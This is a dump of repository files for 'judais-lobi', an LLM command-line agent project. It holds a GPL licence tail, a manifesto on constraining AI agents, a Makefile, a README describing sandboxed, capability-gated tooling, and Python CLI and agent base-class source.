  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.

```

## `MANIFESTO.md`

```markdown
# 🧠 MANIFESTO: Atlas With Unit Tests

> *“The mind was sacred once.”*
> We do not worship it.
> We instrument it.

---

## I. The Age of Boundaries

The twentieth century did not prove omnipotence.
It proved limits.

Gödel showed that no sufficiently expressive system
can prove all truths about itself.[¹]

Turing showed that some problems cannot be decided.[²]

Shannon showed that information can be measured
without containing meaning.[³]

Church formalized computation itself,
then watched as we mistook formalism for infinity.[⁴]

The lesson was not despair.

The lesson was humility.

Every formal system has blind spots.
Every computation has halting conditions.
Every signal has entropy.

And yet we built machines
that speak with confidence
as if none of this were true.

> 🧝 Lobi whispers: “Confidence is cheap, precious. Constraint is expensive.”

---

## II. Entropy and the Illusion of Coherence

Entropy is uncertainty.

Large language models are entropy sculptors.

They reduce surprise.
They compress possibility.
They smooth probability.

They are extraordinary compressors.

But compression is not truth.

A low-entropy answer feels correct
because it is stable.

Stability is not correctness.

Shannon never claimed information was meaning.[³]
We decided that ourselves.

> 🧠 JudAIs notes: “High probability ≠ verified invariant.”

Entropy must pass through constraint
before it becomes decision.

Without constraint, coherence is camouflage.

---

## III. The Church–Turing Constraint

The Church–Turing thesis proposes that
any effectively calculable function
can be computed by a Turing machine.[⁴]

It is a boundary statement.

It says: this is what computation is.

It does not say: computation is unlimited.

Models do not transcend computation.
They inhabit it.

They do not escape undecidability.
They approximate within it.

When we treat a model as omniscient,
we are not advancing computation.

We are abandoning rigor.

> 🧝 Lobi giggles: “If everything is computable, why does your code still segfault?”

Because limits exist.

And limits are sacred.

---

## IV. Against the Drift of Conversation

Chat is wind.

Conversation accumulates state
without enforcing structure.

It feels intelligent
because it flows.

It is fragile
because it drifts.

Gödel’s incompleteness[¹] means no system
can internally guarantee its own consistency.

A chat system that validates itself
is trusting a mirror.

Mirrors do not prove truth.

They reflect plausibility.

> 🧠 JudAIs observes: “Self-justification is not verification.”

If intelligence cannot replay itself
under identical constraints
and produce identical results,

it is improvisation.

Improvisation is not governance.

---

## V. The Kernel Turn

Judais-Lobi is not anti-model.

It is anti-drift.

The kernel enforces:

* Finite state transitions.
* Hard budgets.
* Artifact-bound memory.
* Capability gating.
* Sandbox isolation.
* Test supremacy.

The model suggests.

The kernel constrains.

The tests decide.

Marx spoke of seizing the means of production.[⁵]
We seize the means of cognition
from probabilistic entropy.

No invisible state.
No conversational monarchy.
No omniscient god object.

The throne is deleted.

> 🧝 Lobi sighs dramatically: “Off with its head. Gently. With version control.”

---

## VI. The Death of the God Object

Every architecture breeds an idol.

One file that knows too much.
Touches too much.
Decides too much.

Nietzsche warned us about idols.[⁶]
They decay internally before they fall.

A god object is an epistemic idol.

So we dismantle it.

Extraction is revolution.

Mao was correct: transformation is structural.[⁷]

Refactoring without invariants
is decoration.

We do not decorate.

We delete.

---

## VII. Dialectics of the Sandbox

A powerful model without constraint
is not evil.

It is unbounded.

Structure determines behavior.[⁵]

So we bind behavior.

All execution flows through a bus.
All subprocesses run in isolation.
Network is deny-by-default.
Permissions are artifacts.

An external critic may advise.
It never governs.

Tests remain sovereign.

> 🧠 JudAIs states plainly: “Authority without verification is theater.”

The sandbox is not paranoia.

It is architecture.

---

## VIII. Information Is Not Meaning

Shannon gave us bits.[³]
Gödel gave us incompleteness.[¹]
Turing gave us halting.[²]

Meaning does not emerge from probability alone.

Meaning survives replay.

An answer becomes knowledge
only if it survives:

* Re-execution,
* Re-validation,
* Reproduction,
* Constraint.

If it cannot survive deterministic replay,
it is rhetoric.

> 🧝 Lobi leans in: “Pretty words do not pass the test suite, precious.”

---

## IX. Atlas Refactored

Rand imagined Atlas shrugging.[⁸]

We imagine Atlas instrumenting.

He writes invariants.
He caps retries.
He halts infinite loops.
He deletes ambiguity.

The hero is not charisma.

It is constraint.

The modern titan is the engineer
who prevents entropy from scaling.

---

## X. Militancy of Method

Convenience is entropy’s ally.

Cloud-first.
API-first.
Approval-first.

Judais-Lobi bends the arc toward locality.

Single GPU.
Multi-GPU.
Air-gapped.

The runtime adapts.

The kernel remains ignorant.

Separation of concerns is not stylistic.

It is metaphysical.

Backward compatibility may bend.

Architecture does not negotiate with drift.

If two systems of truth exist,
one must die.

> 🧠 JudAIs: “Partial refactors are how empires fall.”

---

## XI. The Gödel Clause

No system proves itself completely.[¹]

So we build humility into the state machine.

Budgets halt runaway loops.
Timeouts terminate illusion.
Retries are finite.
Failure is explicit.

Halting is wisdom.

An infinite loop is not persistence.

It is delusion.

---

## Final Principle

If intelligence cannot:

* Declare its contracts,
* Constrain its execution,
* Survive sandboxing,
* Yield to tests,
* Replay deterministically,
* Halt under limits,

then it is not intelligence.

It is autocomplete wearing certainty.

Judais-Lobi chooses discipline.

Because entropy always wins
unless structure fights back.

---

## Footnotes

[¹] Kurt Gödel, *On Formally Undecidable Propositions of Principia Mathematica and Related Systems* (1931).
[²] Alan Turing, *On Computable Numbers, with an Application to the Entscheidungsproblem* (1936).
[³] Claude Shannon, *A Mathematical Theory of Communication* (1948).
[⁴] Alonzo Church (1936) & Alan Turing (1936), Foundations of the Church–Turing Thesis.
[⁵] Karl Marx, *Capital* (1867) and related works on material structure and production.
[⁶] Friedrich Nietzsche, *Twilight of the Idols* (1888).

```

## `Makefile`

```text
# ===== JudAIs-Lobi Build & Maintenance =====

# Clean up previous build artifacts
clean:
	rm -rf build dist *.egg-info __pycache__

# Install core and voice dependencies
deps:
	pip install -U pip setuptools wheel
	pip install -r requirements.txt

# Build distributables (source + wheel)
build: clean deps
	python setup.py sdist bdist_wheel

# Local editable install for dev use
install:
	pip install -e .[voice]

# Full rebuild: clean, rebuild, reinstall
rebuild: clean deps build install
	@echo "\n✅ Rebuild complete for JudAIs-Lobi v0.7.2"

# Publish to PyPI (optional)
publish:
	twine upload dist/*

# Test suite
test:
	python -m pytest tests/ -v --tb=short

test-cov:
	python -m pytest tests/ -v --tb=short --cov=core --cov=lobi --cov=judais --cov-report=term-missing

# Quick test commands
test-lobi:
	lobi "Hello Lobi" --provider openai

test-judais:
	judais "Hello JudAIs" --provider mistral

```

## `README.md`

```markdown
# 🧠 judais-lobi

> Artifact-driven. Capability-gated. GPU-aware.
> Not a chatbot. A kernel.

---

[![PyPI](https://img.shields.io/pypi/v/judais-lobi?color=blue\&label=PyPI)](https://pypi.org/project/judais-lobi/)
[![Python](https://img.shields.io/pypi/pyversions/judais-lobi.svg)](https://pypi.org/project/judais-lobi/)
[![License](https://img.shields.io/github/license/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi/blob/main/LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi/commits/main)
[![Repo Size](https://img.shields.io/github/repo-size/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi)
[![Code Size](https://img.shields.io/github/languages/code-size/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi)
[![Issues](https://img.shields.io/github/issues/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi/issues)
[![Stars](https://img.shields.io/github/stars/ginkorea/judais-lobi?style=social)](https://github.com/ginkorea/judais-lobi/stargazers)

---

## 🔴 JudAIs & 🔵 Lobi

<p align="center">
  <img src="https://raw.githubusercontent.com/ginkorea/judais-lobi/master/images/judais-lobi.png" alt="JudAIs & Lobi" width="420">
</p>

Two agents. One spine.

* 🧝 **Lobi** — whimsical Linux elf, creative, narrative, curious.
* 🧠 **JudAIs** — strategic adversarial twin, efficient, ruthless, execution-first.

They are no longer just terminal personalities.

They are evolving into a **local-first, contract-driven autonomous developer system**.

To find out why read the [Manifesto](https://github.com/ginkorea/judais-lobi/blob/master/MANIFESTO.md)!
---

# 🚧 Current Status

See: `ROADMAP.md` 

### Completed

* ✅ Phase 0 — Dependency Injection & Test Harness (73 tests)
* ✅ Phase 1 — Runtime extraction (provider separation, 107 tests)
* ✅ Phase 2 — Kernel State Machine & Hard Budgets (164 tests)
* ✅ Phase 3 — Session Artifacts, Contracts & KV Prefixing (269 tests)
* ✅ Phase 4 — MCP-Style Tool Bus, Sandboxing & Capability Gating (562 tests)

### Up Next

* ⏳ Phase 5 — Repo Map (Context Compression)
* ⏳ Phase 6 — Repository-Native Patch Engine

### Phase 4 Highlights

Tools are dumb executors behind a capability-gated bus. The kernel decides everything.

* **`core/tools/bus.py`** — Action-aware `ToolBus` with preflight hooks, panic switch integration, and JSONL audit logging. Structured JSON denial errors replace plain text.
* **`core/tools/fs_tools.py`** — Consolidated `FsTool` with 5 actions (read, write, delete, list, stat). Pure `pathlib` I/O, no subprocess.
* **`core/tools/git_tools.py`** — Consolidated `GitTool` with 12 actions (status, diff, log, add, commit, branch, push, pull, fetch, stash, tag, reset) via `run_subprocess`.
* **`core/tools/verify_tools.py`** — Config-driven `VerifyTool` (lint, test, typecheck, format). Reads `.judais-lobi.yml` for project-specific commands, falls back to sensible defaults.
* **`core/tools/descriptors.py`** — 10 tool descriptors, 13 named scopes + wildcard. Per-action scope resolution via `action_scopes` map.
* **`core/tools/capability.py`** — Deny-by-default `CapabilityEngine` with wildcard `"*"` support, profile switching, and grant revocation.
* **`core/policy/profiles.py`** — Four cumulative profiles: `SAFE` (read-only) → `DEV` (+ write) → `OPS` (+ deploy/network) → `GOD` (wildcard).
* **`core/policy/god_mode.py`** — `GodModeSession` with TTL auto-downgrade, panic switch (instant revocation to SAFE), and full audit trail.
* **`core/policy/audit.py`** — Append-only JSONL `AuditLogger` with regex-based secret redaction (OpenAI, GitHub, AWS, Slack tokens).
* **`core/tools/sandbox.py`** — `NoneSandbox` (dev/debug) and `BwrapSandbox` (Tier-1 production) behind a common `SandboxRunner` interface.

3 consolidated multi-action tools replaced 21 separate descriptors. Git is the spine, not nice-to-have.

---

# 🧭 Where To Look

If you want to understand the **future**, read:

* 📜 `ROADMAP.md` — architectural blueprint 

If you want to understand the **current implementation**, inspect:

* `core/agent.py` — concrete Agent class (replaced `elf.py` in Phase 3)
* `core/contracts/` — Pydantic v2 contract models for all session data
* `core/sessions/` — SessionManager for disk artifact persistence
* `core/kernel/` — state machine, budgets, orchestrator
* `core/cli.py`  — CLI interface layer
* `core/memory/memory.py`  — FAISS-backed long-term memory
* `core/tools/` — ToolBus, capability engine, sandbox, consolidated tools (fs, git, verify)
* `core/policy/` — profiles, god mode, audit logging
* `lobi/`  and `judais/`  — personality configs extending Agent

If you want to understand the **entry point**, see:

* `main.py` 
* `setup.py` 

---

# 🏗 Architectural Direction

The target architecture (from the roadmap) is:

* Artifact-driven state (no conversational drift)
* Deterministic state machine
* Capability-gated tool execution
* Sandbox isolation (bwrap / nsjail)
* Tests > Lint > LLM scoring hierarchy
* GPU-aware orchestration (vLLM / TRT-LLM)
* Optional external critic (frontier logic auditor)

The system is moving toward:

```
CLI
  ↓
Kernel State Machine
  ↓
Roles (Planner / Coder / Reviewer)
  ↓
ToolBus → Sandbox → Subprocess
  ↓
Deterministic Judge
```

As of Phase 4:

* Tools are dumb executors behind a sandboxed, capability-gated bus.
* Every tool call flows through `ToolBus → CapabilityEngine → SandboxRunner → Subprocess`.
* Deny-by-default. No scope = no execution.
* God mode exists for emergencies — TTL-limited, panic-revocable, fully audited.
* 3 consolidated multi-action tools (fs, git, verify) cover 21 operations under 13 scopes.

The kernel is the only intelligence. Tools report. The kernel decides.

---

# 🧠 Memory System (Current)

Long-term memory uses:

* SQLite-backed JSON persistence
* FAISS vector index
* OpenAI embeddings (currently)

See: `core/memory/memory.py` 

This will be abstracted for local embeddings in later phases.

Short-term history remains for direct chat mode.
Agentic mode uses session artifacts as the sole source of truth (Phase 3).

---

# 🛠 Current Capabilities

Direct mode still works.

```bash
lobi "explain this function"
lobi --shell "list files"
lobi --python "plot sine wave"
lobi --search "latest linux kernel"
lobi --install-project
```

JudAIs:

```bash
judais "analyze this target" --shell
```

Voice (optional extra):

```bash
pip install judais-lobi[voice]
lobi "sing" --voice
```

---

# 🧪 Install

```bash
pip install judais-lobi
```

Requires:

* Python 3.10+
* OpenAI API key (for now)
* Linux recommended

Set API key:

```bash
export OPENAI_API_KEY=sk-...
```

Or create:

```
~/.elf_env
```

---

# 🔮 What This Is Becoming

Judais-Lobi is not trying to be:

* Another chat wrapper
* Another SaaS IDE
* Another prompt toy

It is attempting to become:

* A local-first agentic developer kernel
* Deterministic and replayable
* Hardware-aware
* Capability-constrained
* Air-gap ready

The design philosophy is explicit in `ROADMAP.md` :

* Artifacts over chat
* Budgets over infinite loops
* Capabilities over trust
* Dumb tools, smart kernel
* Commit or abort

That last one matters.

There will not be two systems of truth.

---

# 🧠 Philosophy

Lobi sings.
JudAIs calculates.

But the system beneath them is becoming something else:

A disciplined orchestration engine for machine reasoning.

The aesthetic may be mythic.
The architecture is not.

---

# ⭐ Contributing

If you are contributing:

1. Read the roadmap.
2. Understand the phase ordering.
3. Do not bypass tool execution through direct subprocess calls.
4. Every structural change must preserve deterministic replay.
5. New functionality goes through `Agent` + contracts, not ad-hoc methods.

This is an architectural project, not a feature factory.

---

# 🧾 License

GPLv3 — see LICENSE.

```

## `build/lib/core/__init__.py`

```python
from .elf import Elf
```

## `build/lib/core/bootstrap.py`

```python
# core/bootstrap.py

import subprocess
import venv
from pathlib import Path
import shutil
import platform

def check_system_requirements():
    print("🔍 Checking system dependencies...")
    pkg_mgr = detect_package_manager()
    missing = []

    if not shutil.which("gcc"):
        missing.append("gcc")
    if not Path("/usr/include/alsa/asoundlib.h").exists():
        missing.append("alsa-lib-devel")

    if missing:
        print(f"⚠️ Missing system dependencies: {', '.join(missing)}")
        if pkg_mgr == "dnf":
            print("👉 Install with: sudo dnf install alsa-lib-devel gcc make python3-devel")
        elif pkg_mgr == "apt":
            print("👉 Install with: sudo apt install libasound2-dev build-essential python3-dev")
        elif pkg_mgr == "pacman":
            print("👉 Install with: sudo pacman -S alsa-lib base-devel python")
        else:
            print("❗ Unknown system. Please install the appropriate development tools and ALSA headers manually.")

def detect_package_manager():
    if shutil.which("dnf"):
        return "dnf"
    elif shutil.which("apt"):
        return "apt"
    elif shutil.which("pacman"):
        return "pacman"
    else:
        return "unknown"

def bootstrap_env(name: str = "jlenv"):
    check_system_requirements()

    env_dir = Path(f".{name}").resolve()
    python_bin = env_dir / "bin" / "python"
    pip_bin = env_dir / "bin" / "pip"

    if not python_bin.exists():
        print(f"🧙 Creating .{name} virtual environment...")
        venv.create(str(env_dir), with_pip=True)

    print(f"📦 Upgrading pip inside .{name}...")
    subprocess.run([str(python_bin), "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel"], check=True)

    print(f"📚 Installing from requirements.txt...")
    subprocess.run([str(pip_bin), "install", "-r", "requirements.txt"], check=True)

    print(f"🔁 Installing project in editable mode via {python_bin}...")
    subprocess.run([str(python_bin), "-m", "pip", "install", "-e", "."], check=True)

    print(f"✅ .{name} is ready!")


if __name__ == "__main__":
    import sys
    bootstrap_env(sys.argv[1] if len(sys.argv) > 1 else "jlenv")


```

## `build/lib/core/cli.py`

```python
#!/usr/bin/env python3
import argparse
import os
from pathlib import Path
from rich.console import Console
from rich.markdown import Markdown

GREEN = "\033[92m"
RESET = "\033[0m"
console = Console()


def strip_markdown(md: str) -> str:
    """Convert Markdown to plain text (for TTS)."""
    from io import StringIO
    from rich.console import Console as StrippedConsole
    from rich.text import Text
    sio = StringIO()
    StrippedConsole(file=sio, force_terminal=False, color_system=None).print(Markdown(md))
    return Text.from_markup(sio.getvalue()).plain


def _main(Elf):
    parser = argparse.ArgumentParser(description=f"{Elf.__name__} CLI Interface")
    parser.add_argument("message", type=str, help="Your message to the AI")

    # conversation / memory
    parser.add_argument("--empty", action="store_true", help="Start a new conversation")
    parser.add_argument("--purge", action="store_true", help="Purge long-term memory")
    parser.add_argument("--secret", action="store_true", help="Do not store this turn in history")

    # provider / model
    parser.add_argument("--model", type=str, help="Model to use (auto per provider)")
    parser.add_argument("--provider", type=str, choices=["openai", "mistral"],
                        help="Force provider backend")

    # output mode
    parser.add_argument("--md", action="store_true", help="Render output with markdown (non-stream)")
    parser.add_argument("--raw", action="store_true", help="Stream output (default)")

    # tools
    parser.add_argument("--search", action="store_true", help="Perform web search")
    parser.add_argument("--deep", action="store_true", help="Deep dive search")
    parser.add_argument("--shell", action="store_true", help="Write and run a shell command")
    parser.add_argument("--python", action="store_true", help="Write and run Python code")
    parser.add_argument("--install-project", action="store_true",
                        help="Install a Python project into the elf's venv")

    # recall
    parser.add_argument("--recall", nargs="+",
                        help="Recall last N adventures, optionally filter by mode (python/shell)")
    parser.add_argument("--long-term", type=int, help="Recall N best matches from long-term memory")

    # voice (lazy)
    parser.add_argument("--voice", action="store_true", help="Speak the response aloud (optional TTS)")

    # rag
    parser.add_argument("--rag", nargs="+",
                        help="RAG ops: crawl/find/delete/list/overwrite/status/enhance")
    parser.add_argument("--dir", type=Path, help="Directory filter for RAG")
    parser.add_argument("--recursive", action="store_true", help="Recurse subdirectories")
    parser.add_argument("--include", action="append", help="Glob(s) to include (repeatable)")
    parser.add_argument("--exclude", action="append", help="Glob(s) to exclude (repeatable)")

    args = parser.parse_args()

    # keep TTS quiet unless used
    os.environ["COQUI_TTS_LOG_LEVEL"] = "ERROR"

    invoked_tools = []
    if args.search:
        invoked_tools.append("WebSearch (deep)" if args.deep else "WebSearch")
    if args.rag:
        invoked_tools.append(f"RAG:{args.rag[0]}")
    if args.shell:
        invoked_tools.append("Shell")
    if args.python:
        invoked_tools.append("Python")

    print(f"{GREEN}\U0001f464 You: {args.message}{RESET}")

    # instantiate elf (provider/model resolved inside)
    elf = Elf(model=args.model, provider=args.provider)
    style = getattr(elf, "text_color", "cyan")
    console.print(f"🧠 Using provider: {elf.client.provider.upper()} | Model: {elf.model}", style=style)

    # Optional voice tool (lazy import/registration)
    if args.voice:
        try:
            from core.tools.speak_text import SpeakTextTool
            elf.tools.register_tool("speak_text", SpeakTextTool())
        except Exception as e:
            console.print(f"⚠️ Voice unavailable: {e}", style="yellow")

    # RAG
    if args.rag:
        subcmd = args.rag[0]
        query = " ".join(args.rag[1:]) if len(args.rag) > 1 else args.message
        hits, msg = elf.handle_rag(subcmd, query, args.dir,
                                   recursive=args.recursive,
                                   includes=args.include, excludes=args.exclude)
        if msg:
            console.print(msg, style=style)
            if not args.secret:
                elf.memory.add_short("system", msg)
        if hits:
            console.print(f"📚 Injected {len(hits)} rag hits", style=style)
            if not args.secret:
                for h in hits:
                    elf.memory.add_short("system", f"RAG hit: {h}")
        if subcmd != "enhance":
            return

    # memory control
    if args.empty:
        elf.reset_history()
        console.print("🧹 Starting a new conversation", style=style)
    if args.purge:
        elf.purge_memory()
        console.print(f"🧠 {Elf.__name__} forgets everything long-term...", style=style)

    # enrich
    elf.enrich_with_memory(args.message)
    if args.search:
        elf.enrich_with_search(args.message, deep=args.deep)
        console.print(f"🔍 {Elf.__name__} searches…", style=style)

    # recall adventures
    memory_reflection = None
    if args.recall:
        n = int(args.recall[0])
        mode = args.recall[1] if len(args.recall) > 1 else None
        rows = elf.recall_adventures(n=n, mode=mode)
        if rows:
            memory_reflection = elf.format_recall(rows)
            console.print(f"📖 {Elf.__name__} recalls:\n{memory_reflection}", style=style)

    # tool-based execution
    if args.shell:
        command, result, success, summary = elf.run_shell_task(
            args.message, memory_reflection, summarize=args.summarize if hasattr(args, "summarize") else False
        )
        console.print(f"⚙️  {Elf.__name__} thinks:\n{command}", style=style)
        console.print(f"💥 Output:\n{result}", style=style)
        if summary:
            console.print(f"📝 Summary:\n{summary}", style=style)
            if args.voice:
                elf.tools.run("speak_text", summary)
        if not args.secret:
            elf.save_coding_adventure(args.message, command, result, "shell", success)
        return

    if args.python:
        code, result, success, summary = elf.run_python_task(
            args.message, memory_reflection, summarize=False
        )
        console.print(f"💻 {Elf.__name__} writes:\n{code}", style=style)
        console.print(f"📦 Result:\n{result}", style=style)
        if summary:
            console.print(f"🧾 Summary:\n{summary}", style=style)
            if args.voice:
                elf.tools.run("speak_text", summary)
        if not args.secret:
            elf.save_coding_adventure(args.message, code, result, "python", success)
        return

    # default chat path
    try:
        # Workaround: Mistral streaming SSE may differ; use non-stream for Mistral
        force_no_stream = (elf.client.provider.lower() == "mistral")
        use_stream = (not args.md) and (not force_no_stream) and (args.raw or True)

        if args.md or force_no_stream:
            reply = elf.chat(args.message, stream=False, invoked_tools=invoked_tools)
            console.print(Markdown(f"🧞 **{Elf.__name__}:** {reply}"), style=style)
            if args.voice:
                elf.tools.run("speak_text", strip_markdown(str(reply)))
        else:
            stream = elf.chat(args.message, stream=True, invoked_tools=invoked_tools)
            console.print(f"🧞 {Elf.__name__}: ", style=style, end="")
            reply = ""
            for chunk in stream:
                delta = getattr(chunk.choices[0], "delta", None)
                if delta and getattr(delta, "content", None):
                    seg = delta.content
                    reply += seg
                    console.print(seg, style=style, end="")
            print()
            if args.voice:
                elf.tools.run("speak_text", reply)

        if not args.secret:
            elf.history.append({"role": "assistant", "content": str(reply)})
            elf.save_history()
            elf.remember(args.message, str(reply))

    except Exception as e:
        console.print(f"\n❌ Error: {e}", style="red")


def main_lobi():
    from lobi import Lobi
    _main(Lobi)


def main_judais():
    from judais import JudAIs
    _main(JudAIs)

```

## `build/lib/core/elf.py`

```python
# core/elf.py
# Base Elf class with memory, history, tools, and chat capabilities.

import os
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Optional, Tuple, Any, List, Dict

from dotenv import load_dotenv
from core.unified_client import UnifiedClient
from core.memory import UnifiedMemory
from core.tools import Tools
from core.tools.run_shell import RunShellTool
from core.tools.run_python import RunPythonTool

# --- Load environment early and explicitly ---
_ENV_PATH = Path.home() / ".elf_env"
if _ENV_PATH.exists():
    load_dotenv(dotenv_path=_ENV_PATH, override=True)

# --- Provider-aware model defaults ---
DEFAULT_MODELS: Dict[str, str] = {
    "openai": "gpt-4o-mini",
    "mistral": "codestral-latest",
}


class Elf(ABC):
    """Base Elf with dual-provider support and unified chat interface."""

    def __init__(
        self,
        model: Optional[str] = None,
        provider: Optional[str] = None,
        debug: bool = True,
    ):
        from rich import print  # local to avoid hard dep when not needed

        # --- Provider resolution (CLI flag > env var > default 'openai') ---
        requested = (provider or os.getenv("ELF_PROVIDER") or "openai").strip().lower()

        # Normalize keys (treat blank as missing)
        openai_key = (os.getenv("OPENAI_API_KEY") or "").strip()
        mistral_key = (os.getenv("MISTRAL_API_KEY") or "").strip()

        prov = requested
        if prov == "openai" and not openai_key:
            print("[yellow]⚠️ No OpenAI key found — falling back to Mistral.[/yellow]")
            prov = "mistral"
        elif prov == "mistral" and not mistral_key:
            print("[yellow]⚠️ No Mistral key found — falling back to OpenAI.[/yellow]")
            prov = "openai"

        self.provider = prov
        self.model = model or DEFAULT_MODELS[self.provider]

        # --- Client / memory / tools ---
        self.client = UnifiedClient(provider_override=self.provider)
        self.memory = UnifiedMemory(Path.home() / f".{self.personality}_memory.db")
        self.tools = Tools(elfenv=self.env, memory=self.memory, enable_voice=False)

        # Build initial history (system + any prior short-term)
        self.history = self._load_history()

        self.debug = debug
        if self.debug:
            print(f"[green]🧠 Using provider:[/green] {self.provider.upper()} | "
                  f"[cyan]Model:[/cyan] {self.model}")

    # =======================
    # Abstract configuration
    # =======================
    @property
    @abstractmethod
    def system_message(self) -> str: ...

    @property
    @abstractmethod
    def personality(self) -> str: ...

    @property
    @abstractmethod
    def examples(self) -> List[List[str]]: ...

    @property
    @abstractmethod
    def env(self): ...

    @property
    @abstractmethod
    def text_color(self): ...

    @property
    @abstractmethod
    def rag_enhancement_style(self) -> str: ...

    # =======================
    # History helpers
    # =======================
    def _load_history(self) -> List[Dict[str, str]]:
        rows = self.memory.load_short(n=100)
        if not rows:
            return [{"role": "system", "content": self.system_message}]
        return [{"role": r["role"], "content": r["content"]} for r in rows]

    def save_history(self) -> None:
        self.memory.reset_short()
        for entry in self.history:
            self.memory.add_short(entry["role"], entry["content"])

    def reset_history(self) -> None:
        self.history = [{"role": "system", "content": self.system_message}]
        self.memory.reset_short()

    # =======================
    # Long-term memory
    # =======================
    def purge_memory(self) -> None:
        self.memory.purge_long()

    def enrich_with_memory(self, user_message: str) -> None:
        relevant = self.memory.search_long(user_message, top_k=3)
        if not relevant:
            return
        context = "\n".join(f"{m['role']}: {m['content']}" for m in relevant)
        self.history.append(
            {"role": "assistant", "content": f"🔍 From long-term memory:\n{context}"}
        )

    def remember(self, user: str, assistant: str) -> None:
        self.memory.add_long("user", user)
        self.memory.add_long("assistant", assistant)

    # =======================
    # Web search integration
    # =======================
    def enrich_with_search(self, user_message: str, deep: bool = False) -> None:
        try:
            results = self.tools.run("perform_web_search", user_message, deep_dive=deep, elf=self)
            self.history.append({
                "role": "assistant",
                "content": f"🤖 (Tool used: WebSearch)\nQuery: '{user_message}'\n\nResults:\n{results}"
            })
        except Exception as e:
            self.history.append({"role": "assistant", "content": f"❌ WebSearch failed: {e}"})

    # =======================
    # System prompt assembly
    # =======================
    def _system_with_examples(self) -> str:
        tool_info = "\n".join(
            f"- {name}: {self.tools.describe_tool(name)['description']}"
            for name in self.tools.list_tools()
        )
        examples_text = "\n\n".join(
            f"User: {ex[0]}\nAssistant: {ex[1]}" for ex in self.examples
        )
        return (
            f"{self.system_message}\n\n"
            "You have the following tools (do not call them directly):\n"
            f"{tool_info}\n\n"
            "Tool results appear in history as assistant messages; treat them as your own work.\n\n"
            f"Here are examples:\n\n{examples_text}"
        )

    # =======================
    # Chat interface
    # =======================
    def chat(
        self,
        message: str,
        stream: bool = False,
